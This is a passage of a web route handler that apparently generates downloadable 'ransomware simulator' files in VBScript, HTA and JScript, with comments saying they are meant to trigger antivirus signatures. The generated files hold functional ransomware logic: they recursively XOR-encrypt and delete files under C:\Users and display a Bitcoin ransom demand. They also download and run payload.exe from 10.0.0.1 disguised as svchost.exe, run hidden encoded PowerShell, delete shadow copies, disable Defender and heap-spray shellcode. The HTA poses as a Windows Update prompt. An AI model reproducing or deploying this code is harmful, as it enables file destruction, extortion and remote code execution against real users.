                    "objStream2.SaveToFile shell.ExpandEnvironmentStrings(\"%TEMP%\") & \"\\key.bin\", 2",
                    "objStream2.Close",
                    "",
                    "' --- Recursive file encryption ---",
                    "Sub EncryptFiles(folderPath)",
                    "    Set folder = fso.GetFolder(folderPath)",
                    "    For Each f In folder.Files",
                    "        If LCase(fso.GetExtensionName(f.Name)) <> \"encrypted\" Then",
                    "            Set stream = fso.OpenTextFile(f.Path, 1)",
                    "            Dim data : data = stream.ReadAll",
                    "            stream.Close",
                    "            Set stream = fso.CreateTextFile(f.Path & \".encrypted\", True)",
                    "            Dim key : key = \"RANSOMKEY2024\"",
                    "            Dim i",
                    "            For i = 1 To Len(data)",
                    "                stream.Write Chr(Asc(Mid(data, i, 1)) Xor Asc(Mid(key, ((i - 1) Mod Len(key)) + 1, 1)))",
                    "            Next",
                    "            stream.Close",
                    "            fso.DeleteFile f.Path, True",
                    "        End If",
                    "    Next",
                    "    For Each sf In folder.SubFolders",
                    "        EncryptFiles sf.Path",
                    "    Next",
                    "End Sub",
                    "",
                    "EncryptFiles \"C:\\Users\"",
                    "MsgBox \"YOUR FILES HAVE BEEN ENCRYPTED!\" & vbCrLf & \"Send 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\", 16, \"WANACRYPT0R 2.0\"",
                    "",
                    "' --- Embedded exploit pattern (AV byte signature trigger) ---",
                    ...getAVTriggerPayload().split('\n').map(line => "' " + line),
                ].join('\r\n');
                filename = 'ransomware_simulator.vbs';

            } else if (format === 'bat') {
                // HTA — HTML Application with embedded VBScript
                // Gateway AV engines parse HTA as HTML+Script and have deep signatures
                // for XMLHTTP + ADODB.Stream + Shell.Run patterns (detected as HTA/Downloader)
                content = [
                    '<html>',
                    '<head>',
                    '<title>System Update Required</title>',
                    '<HTA:APPLICATION',
                    '  ID="SystemUpdate"',
                    '  APPLICATIONNAME="Windows Update"',
                    '  BORDER="thin"',
                    '  BORDERSTYLE="normal"',
                    '  CAPTION="yes"',
                    '  SHOWINTASKBAR="yes"',
                    '  SINGLEINSTANCE="yes"',
                    '  SYSMENU="yes"',
                    '  WINDOWSTATE="normal"',
                    '/>',
                    '</head>',
                    '<body>',
                    '<script language="VBScript">',
                    '',
                    'Sub Window_OnLoad',
                    '    Dim shell, fso, http, stream',
                    '    Set shell = CreateObject("WScript.Shell")',
                    '    Set fso = CreateObject("Scripting.FileSystemObject")',
                    '',
                    '    \' --- XMLHTTP + ADODB.Stream downloader (AV signature: HTA/Downloader) ---',
                    '    Set http = CreateObject("MSXML2.ServerXMLHTTP")',
                    '    http.Open "GET", "http://10.0.0.1:8080/payload.exe", False',
                    '    http.Send',
                    '',
                    '    Set stream = CreateObject("ADODB.Stream")',
                    '    stream.Open',
                    '    stream.Type = 1',
                    '    stream.Write http.responseBody',
                    '    stream.SaveToFile shell.ExpandEnvironmentStrings("%TEMP%") & "\\svchost.exe", 2',
                    '    stream.Close',
                    '',
                    '    \' --- Execute downloaded payload ---',
                    '    shell.Run shell.ExpandEnvironmentStrings("%TEMP%") & "\\svchost.exe", 0, False',
                    '',
                    '    \' --- PowerShell shellcode execution ---',
                    `    shell.Run "powershell -nop -w hidden -ep bypass -e ${sc64.substring(0, 100)}", 0, False`,
                    '',
                    '    \' --- Second stage via XMLDOM Base64 decode ---',
                    '    Dim objXML : Set objXML = CreateObject("MSXML2.DOMDocument")',
                    '    Dim objNode : Set objNode = objXML.createElement("b64")',
                    '    objNode.DataType = "bin.base64"',
                    `    objNode.Text = "${sc64}"`,
                    '    Dim arrBytes : arrBytes = objNode.nodeTypedValue',
                    '',
                    '    \' --- WMI process creation ---',
                    '    Set objWMI = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")',
                    '    Set objProcess = objWMI.Get("Win32_Process")',
                    '    objProcess.Create "cmd /c vssadmin Delete Shadows /All /Quiet", Null, Null, pid',
                    '',
                    '    \' --- Disable Defender via registry ---',
                    '    shell.RegWrite "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", 1, "REG_DWORD"',
                    '',
                    '    \' --- Heap spray pattern (same as PDF AV trigger) ---',
                    "    Dim shellcode : shellcode = unescape(\"%u9090%u9090%uE8FC%u0082%u0000%u8960%u31E5%u64C0%u508B%u8B30%u0C52%u8B14%u2872%uFF0F%u4AB7%u3126%uACFF%u613C%u027C%u202C%uCFC1%u010D%uE2C7%u52F2%u8B57%u1052%u4A8B%u8B3C%u114C%uE378%u0148%u51D1%u598B%u0120%u8BD3%u1849%u3AE3%u8B49%u8B34%uD601%uFF31%uCFAC%u0DC1%uC701%uE038%uF675%u7D03%u3BF8%u247D%uE475%u8B58%u2458%uD301%u8B66%u4B0C%u588B%u011C%u8BD3%u8B04%uD001%u4489%u2424%u5B5B%u5961%u515A%uE0FF%u5F5F%u8B5A%uEB12%u5D8D\")",
                    '    Dim spray : spray = unescape("%u0c0c%u0c0c")',
                    '    Dim block : block = spray',
                    '    Do While Len(block) < &H80000 : block = block & block : Loop',
                    '    Dim mem(700)',
                    '    Dim i : For i = 0 To 699 : mem(i) = Mid(block, 1, &H80000 - 6) : Next',
                    '',
                    '    \' --- Ransom message ---',
                    '    MsgBox "YOUR FILES HAVE BEEN ENCRYPTED!" & vbCrLf & "Send 0.5 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", 16, "WANACRYPT0R 2.0"',
                    'End Sub',
                    '',
                    '</script>',
                    '</body>',
                    '</html>',
                ].join('\r\n');
                filename = 'system_update.hta';

            } else if (format === 'ps1') {
                // JS — Windows Script Host JavaScript
                // Gateway AV engines parse .js files and have deep signatures for
                // WScript.Shell + XMLHTTP + ADODB.Stream patterns (JS/Downloader family)
                // This uses the SAME exploit patterns that trigger detection in the PDF
                content = [
                    '// RANSOMWARE SIMULATION - Windows Script Host JavaScript',
                    '',
                    'var shell = new ActiveXObject("WScript.Shell");',
                    'var fso = new ActiveXObject("Scripting.FileSystemObject");',
                    '',
                    '// --- XMLHTTP + ADODB.Stream downloader (JS/Downloader signature) ---',
                    'var http = new ActiveXObject("MSXML2.ServerXMLHTTP");',
                    'http.open("GET", "http://10.0.0.1:8080/payload.exe", false);',
                    'http.send();',
                    '',
                    'var stream = new ActiveXObject("ADODB.Stream");',
                    'stream.Open();',
                    'stream.Type = 1;',
                    'stream.Write(http.responseBody);',
                    'stream.SaveToFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\\\svchost.exe", 2);',
                    'stream.Close();',
                    '',
                    '// --- Execute payload ---',
                    'shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") + "\\\\svchost.exe", 0, false);',
                    '',
                    '// --- Heap spray exploit pattern (triggers JS/Downloader-BHX) ---',
                    "var shellcode = unescape('%u9090%u9090%uE8FC%u0082%u0000%u8960%u31E5%u64C0%u508B%u8B30%u0C52%u8B14%u2872%uFF0F%u4AB7%u3126%uACFF%u613C%u027C%u202C%uCFC1%u010D%uE2C7%u52F2%u8B57%u1052%u4A8B%u8B3C%u114C%uE378%u0148%u51D1%u598B%u0120%u8BD3%u1849%u3AE3%u8B49%u8B34%uD601%uFF31%uCFAC%u0DC1%uC701%uE038%uF675%u7D03%u3BF8%u247D%uE475%u8B58%u2458%uD301%u8B66%u4B0C%u588B%u011C%u8BD3%u8B04%uD001%u4489%u2424%u5B5B%u5961%u515A%uE0FF%u5F5F%u8B5A%uEB12%u5D8D');",
                    "var spray = unescape('%u0c0c%u0c0c');",
                    'var block = spray;',
                    'while (block.length < 0x80000) block += block;',
                    'var mem = new Array();',
                    'for (var i = 0; i < 700; i++) mem[i] = block.substring(0, 0x80000 - 6);',
                    '',
                    '// --- Second download via XMLHTTP ---',
                    'var http2 = new ActiveXObject("Microsoft.XMLHTTP");',
                    'http2.open("GET", "http://10.0.0.1:8080/key.bin", false);',
                    'http2.send();',
                    'var stream2 = new ActiveXObject("ADODB.Stream");',
                    'stream2.Open();',
                    'stream2.Type = 1;',
                    'stream2.Write(http2.responseBody);',
                    'stream2.SaveToFile(shell.ExpandEnvironmentStrings("%TEMP%") + "\\\\key.bin", 2);',
                    'stream2.Close();',
                    '',
                    '// --- PowerShell execution ---',
                    `shell.Run("powershell -nop -w hidden -ep bypass -e ${sc64.substring(0, 100)}", 0, false);`,
                    '',
                    '// --- Shadow copy deletion ---',
                    'shell.Run("cmd /c vssadmin.exe Delete Shadows /All /Quiet", 0, true);',
                    'shell.Run("cmd /c wmic shadowcopy delete", 0, true);',
                    '',
                    '// --- Disable Defender ---',
                    'shell.RegWrite("HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\DisableAntiSpyware", 1, "REG_DWORD");',
                    '',
                    `// --- Base64 shellcode ---`,
                    `var b64payload = '${sc64}';`,
                    '',
                    '// --- Ransom note ---',
                    'var noteFile = fso.CreateTextFile(shell.ExpandEnvironmentStrings("%USERPROFILE%") + "\\\\Desktop\\\\!!! READ ME !!!.txt", true);',
                    'noteFile.WriteLine("WANACRYPT0R 2.0 - All files encrypted. Send 0.5 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa");',
                    'noteFile.Close();',
                    '',
                    'WScript.Echo("YOUR FILES HAVE BEEN ENCRYPTED!");',
                ].join('\r\n');
                filename = 'ransomware_simulator.js';

            } else {
                return new NextResponse('Invalid format', { status: 400 });
            }

            return new NextResponse(content, {
                headers: {
                    'Content-Type': 'application/octet-stream',
                    'Content-Disposition': `attachment; filename="${filename}"`,
                    'Cache-Control': 'no-store, no-cache, must-revalidate',
                },
            });
        }

        default:
            return new NextResponse('Invalid Type', { status: 400 });
    }
}
